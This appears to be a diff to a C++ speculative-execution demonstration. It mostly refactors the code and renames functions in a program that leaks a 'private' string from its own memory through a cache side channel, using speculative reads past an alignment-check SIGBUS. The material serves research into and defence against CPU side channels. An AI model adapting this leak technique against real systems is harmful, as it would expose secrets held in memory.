@@ -21,8 +21,9 @@
  * Afterwards we turn on the alignment enforcement and try to read the
  * unaligned private array with that enforcement. That always leads to SIGBUS
  * however the unaligned data are processed speculatively.
- * It is necessary to have the AM in CR0 register turned on, but on Linux it is
- * a standard configuration.
+ * It is necessary to have the AM (alignment mask) in CR0 register turned on,
+ * but on Linux it is a standard configuration. If the AM bit is off, the
+ * demonstration runs into the unreachable code and terminates with a failure.
  **/
 
 #ifndef __linux__
@@ -58,17 +59,17 @@ size_t *private_array = new size_t[strlen(private_data) + 1];
 size_t *disaligned_private_data = reinterpret_cast<size_t *>(
     reinterpret_cast<char *>(private_array) + 1);
 
-static void initialize_disaligned_data() {
+static void InitializeDisalignedData() {
   // Initialize disaligned arrays.
-  for (int i = 0; i < strlen(public_data); ++i) {
+  for (size_t i = 0; i < strlen(public_data); ++i) {
     disaligned_public_data[i] = public_data[i];
   }
-  for (int i = 0; i < strlen(private_data); ++i) {
+  for (size_t i = 0; i < strlen(private_data); ++i) {
     disaligned_private_data[i] = private_data[i];
   }
 }
 
-static char leak_byte(size_t *disaligned_data, size_t offset) {
+static char LeakByte(size_t *disaligned_data, size_t offset) {
   CacheSideChannel sidechannel;
   const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
 
@@ -80,7 +81,8 @@ static char leak_byte(size_t *disaligned_data, size_t offset) {
     // cache.
     ForceRead(isolated_oracle.data() + disaligned_data[safe_offset]);
 
-    EnforceAlignmentAndSerialize();
+    EnforceAlignment();
+    MemoryAndSpeculationBarrier();
 
     // Accesses unaligned data despite of the enforcement. Triggers SIGBUS.
     ForceRead(isolated_oracle.data() + disaligned_data[offset]);
@@ -130,7 +132,7 @@ static void sigbus(
 #endif
 }
 
-static void set_signal() {
+static void SetSignal() {
   struct sigaction act;
   act.sa_sigaction = sigbus;
   act.sa_flags = SA_SIGINFO;
@@ -138,13 +140,13 @@ static void set_signal() {
 }
 
 int main() {
-  initialize_disaligned_data();
-  set_signal();
+  InitializeDisalignedData();
+  SetSignal();
   std::cout << "Leaking the string: ";
   std::cout.flush();
   size_t private_offset = disaligned_private_data - disaligned_public_data;
   for (size_t i = 0; i < strlen(private_data); ++i) {
-    std::cout << leak_byte(disaligned_public_data, private_offset + i);
+    std::cout << LeakByte(disaligned_public_data, private_offset + i);
     std::cout.flush();
   }
   std::cout << "\nDone!\n";
